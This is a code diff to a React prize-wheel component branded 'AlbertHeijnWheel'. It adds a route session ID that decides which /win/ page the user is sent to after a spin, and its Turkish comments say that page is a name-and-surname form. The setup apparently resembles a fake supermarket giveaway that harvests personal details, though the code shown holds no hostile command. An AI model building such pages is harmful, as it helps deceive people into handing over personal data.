@@ -7,6 +7,7 @@ import { ConfettiEffect } from "@/components/AlbertHeijnWheel/ConfettiEffect";
 import { PrizePopup } from "@/components/AlbertHeijnWheel/PrizePopup";
 import { AlbertHeijnWheel } from "@/components/AlbertHeijnWheel/AlbertHeijnWheel";
 import { useIsMobile } from "@/hooks/useIsMobile";
+import { getPreferredRouteSessionId } from "@/lib/session-id-client";
 import { DEFAULT_WHEEL_VIEWPORT, resolveWheelLayout } from "./wheel-layout";
 
 type PrizeKind = "amount" | "message";
@@ -120,10 +121,17 @@ function storeWinHistory(prize: string) {
   return nextHistory;
 }
 
-export function WheelClient({ sessionId }: { sessionId: string }) {
+export function WheelClient({
+  sessionId,
+  routeSessionId,
+}: {
+  sessionId: string;
+  routeSessionId?: string;
+}) {
   const router = useRouter();
   const supabase = createBrowserSupabaseClient();
   const isMobile = useIsMobile();
+  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
   const continueButtonRef = useRef<HTMLButtonElement | null>(null);
   const pendingPrizeRef = useRef<PrizeSegment | null>(null);
   const rotationRef = useRef(0);
@@ -326,7 +334,7 @@ export function WheelClient({ sessionId }: { sessionId: string }) {
 
     // Çark durduktan sonra popup göstermeden direkt form sayfasına (isim soyisim) yönlendir
     setTimeout(() => {
-      router.push(`/win/${sessionId}`);
+      router.push(`/win/${effectiveRouteSessionId}`);
     }, 700); // Kullanıcının çarkın nerede durduğunu görebilmesi için kısa bir gecikme
   };
 
@@ -363,7 +371,7 @@ export function WheelClient({ sessionId }: { sessionId: string }) {
       prize: resultPrize?.text ?? null,
     });
     setShowPopup(false);
-    router.push(`/win/${sessionId}`);
+    router.push(`/win/${effectiveRouteSessionId}`);
   };
 
   if (error) {
